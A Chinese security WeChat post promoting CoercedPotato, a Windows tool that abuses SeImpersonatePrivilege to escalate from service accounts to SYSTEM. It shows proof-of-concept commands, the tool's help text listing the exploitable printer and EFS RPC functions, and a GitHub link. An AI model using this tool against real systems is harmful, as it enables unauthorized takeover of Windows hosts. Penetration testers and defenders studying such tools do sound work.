#  新Potato | 土豆家族又添一员

Mr.x  [ SecHub网络安全社区 ](javascript:void\(0\);)

**SecHub网络安全社区** ![]()

微信号 secevery0x01

功能介绍
隶属于SecHub网络安全社区，致力于研究渗透测试、红蓝对抗、应急响应、实战案例、钓鱼社工、和漏洞分析，定期分享实战案例、技术教程、安全工具等前沿网络安全资源。

____

___发表于_

收录于合集 #渗透工具 52个

**点击蓝字 关注我们**

![]()

 **免责声明**

本文发布的工具和脚本，仅用作测试和学习研究，禁止用于商业用途，不能保证其合法性，准确性，完整性和有效性，请根据情况自行判断。

如果任何单位或个人认为该项目的脚本可能涉嫌侵犯其权利，则应及时通知并提供身份证明，所有权证明，我们将在收到认证文件后删除相关内容。

文中所涉及的技术、思路及工具等相关知识仅供安全为目的的学习使用，任何人不得将其应用于非法用途及盈利等目的，间接使用文章中的任何工具、思路及技术，我方对于由此引起的法律后果概不负责。

 **添加星标不迷路  
**

由于公众号推送规则改变，微信头条公众号信息会被折叠，为了避免错过公众号推送，请大家动动手指设置“星标”，设置之后就可以和从前一样收到推送啦![](https://res.wx.qq.com/t/wx_fed/we-
emoji/res/v1.3.10/assets/newemoji/2_04.png)

  

## 关于

从Patate（网络/网络服务）到System，在Windows 10，Windows 11和Server
2022上滥用`SeImpersonatePrivilege`。

一个快速的pooooc：

    
    
    .\CoercedPotato.exe -c whoami
    
    
    具有交互式外壳的其他PoC：
    
    
    .\CoercedPotato.exe -c cmd.exe
    
    
    ![]()

## 使用

您可以使用`--help`选项检查帮助消息。

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
                                                                         ____                            _ ____       _        _          / ___|___   ___ _ __ ___ ___  __| |  _ \ ___ | |_ __ _| |_ ___   | |   / _ \ / _ \ '__/ __/ _ \/ _` | |_) / _ \| __/ _` | __/ _ \  | |__| (_) |  __/ | | (_|  __/ (_| |  __/ (_) | || (_| | || (_) |  \____\___/ \___|_|  \___\___|\__,_|_|   \___/ \__\__,_|\__\___/                                                                                                              @Hack0ura @Prepouce                                                                      CoercedPotato is an automated tool for privilege escalation exploit using SeImpersonatePrivilege or SeImpersonatePrimaryToken.Usage: .\CoercedPotato.exe [OPTIONS]  
    Options:  -h,--help                   Print this help message and exit  -c,--command TEXT REQUIRED  Program to execute as SYSTEM (i.e. cmd.exe)  -i,--interface TEXT         Optionnal interface to use (default : ALL) (Possible values : ms-rprn, ms-efsr  -n,--exploitId INT          Optionnal exploit ID (Only usuable if interface is defined)                                -> ms-rprn :                                  [0] RpcRemoteFindFirstPrinterChangeNotificationEx()                                 [1] RpcRemoteFindFirstPrinterChangeNotification()                               -> ms-efsr                                  [0] EfsRpcOpenFileRaw()                                 [1] EfsRpcEncryptFileSrv()                                 [2] EfsRpcDecryptFileSrv()                                 [3] EfsRpcQueryUsersOnFile()                                 [4] EfsRpcQueryRecoveryAgents()                                 [5] EfsRpcRemoveUsersFromFile()                                 [6] EfsRpcAddUsersToFile()                                 [7] EfsRpcFileKeyInfo() # NOT WORKING                                 [8] EfsRpcDuplicateEncryptionInfoFile()                                 [9] EfsRpcAddUsersToFileEx()                                 [10] EfsRpcFileKeyInfoEx() # NOT WORKING                                 [11] EfsRpcGetEncryptedFileMetadata()                                 [12] EfsRpcEncryptFileExSrv()                                 [13] EfsRpcQueryProtectors()                                -f,--force BOOLEAN          Force all RPC functions even if it says 'Exploit worked!' (Default value : false)  --interactive BOOLEAN       Set wether the process should be run within the same shell or open a new window. (Default value : true)                                                                                                                                                                                                                                

  

 **项目地址**  

  * 

    
    
     https://github.com/hackvens/CoercedPotato

  

  

欢迎关注SecHub网络安全社区，SecHub网络安全社区目前邀请式注册，邀请码获取见公众号菜单【邀请码】

![]()

 **联系方式**

电话｜010-86460828

官网｜http://www.secevery.com

![]()

 **关注我们**

![]()![]()![]()

 **公众号：** sechub安全

 **哔哩号：** SecHub官方账号

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

